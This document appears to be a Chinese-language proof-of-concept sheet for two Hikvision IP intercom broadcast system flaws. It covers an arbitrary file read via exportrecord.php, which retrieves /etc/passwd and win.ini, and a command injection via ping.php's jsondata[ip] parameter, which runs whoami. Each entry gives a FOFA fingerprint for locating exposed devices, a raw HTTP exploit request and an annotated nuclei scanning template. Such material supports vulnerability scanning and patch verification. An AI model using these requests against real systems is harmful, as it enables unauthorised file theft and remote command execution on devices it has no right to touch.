## 海康威视IP网络对讲广播系统任意文件下载 CVE-2023-6893

#### fofa

> icon_hash="-1830859634"

#### poc

```http
GET /php/exportrecord.php?downtype=10&downname=/etc/passwd HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
```

#### nuclei

```yaml
id: CVE-2023-6893
# 模板的唯一标识，nuclei 扫描期间会输出该内容

info:
# 信息
  name: 海康威视IP网络对讲广播系统任意文件下载
  # 漏洞名称
  author: mewhz
  # 作者
  severity: low
  # 严重程度
  description: IP网络对讲广播系统在3.0.3_20201113_RELEASE(HIK)版本中存在任意文件下载漏洞，未授权的攻击者能够通过/php/exportrecord.php文件读取任意文件内容，导致服务器的敏感信息泄露
  # 说明
  metadata:
  # 元数据
    max-request: 2
  tags: Hikvision
  # 标签，可以通过标签进行扫描

http:
# http 请求
  - method: GET
    # 请求方法
    path:
      - "{{BaseURL}}/php/exportrecord.php?downtype=10&downname=/etc/passwd"
      - "{{BaseURL}}/php/exportrecord.php?downtype=10&downname=C://Windows//win.ini"
      # {{BaseURL}} 使用请求中的 URL 内容

    stop-at-first-match: true
    # 命中第一个匹配就返回

    matchers-condition: and
    # 匹配规则的逻辑关系，and 表示所有匹配条件必须都为 true
    matchers:
    # 匹配规则
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[(font|extension|file)s\\]"
        condition: or

      - type: status
        # 对状态码进行匹配
        status:
          - 200

```

---

## 海康威视IP网络对讲广播系统 ping.php 命令执行 CVE-2023-6895

#### fofa

> icon_hash="-1830859634"

#### poc

```http
POST /php/ping.php HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded

jsondata%5Btype%5D=3&jsondata%5Bip%5D=whoami
```

#### nuclei

```yaml
id: CVE-2023-6895
# 模板的唯一标识，nuclei 扫描期间会输出该内容

info:
# 信息
  name: 海康威视IP网络对讲广播系统 ping.php 命令执行
  # 漏洞名称
  author: mewhz
  # 作者
  severity: critical
  # 严重程度
  description: 海康威视存在RCE漏洞，该漏洞源于文件/php/ping.php的参数jsondata[ip]会导致操作系统命令注入，执行任意命令，通过该漏洞可以获取服务器权限。
  # 说明
  metadata:
  # 元数据
    max-request: 1
  tags: Hikvision
  # 标签，可以通过标签进行扫描

http:
  - raw:
    - |
        POST /php/ping.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        jsondata%5Btype%5D=3&jsondata%5Bip%5D=whoami
    # {{Hostname}} 替换主机名

    stop-at-first-match: true
    # 命中第一个匹配就返回

    matchers-condition: and
    # 匹配规则的逻辑关系，and 表示所有匹配条件必须都为 true
    matchers:
    # 匹配规则

      - type: word
      # 字符串匹配
        part: body
        # 对响应 body 进行字符串匹配
        words:
          - "admin"
          - "\\\\"
          - ">whoami"
        condition: or
        # 当匹配到某个单词时，该请求被标记为成功

      - type: status
        # 对状态码进行匹配
        status:
          - 200
```

---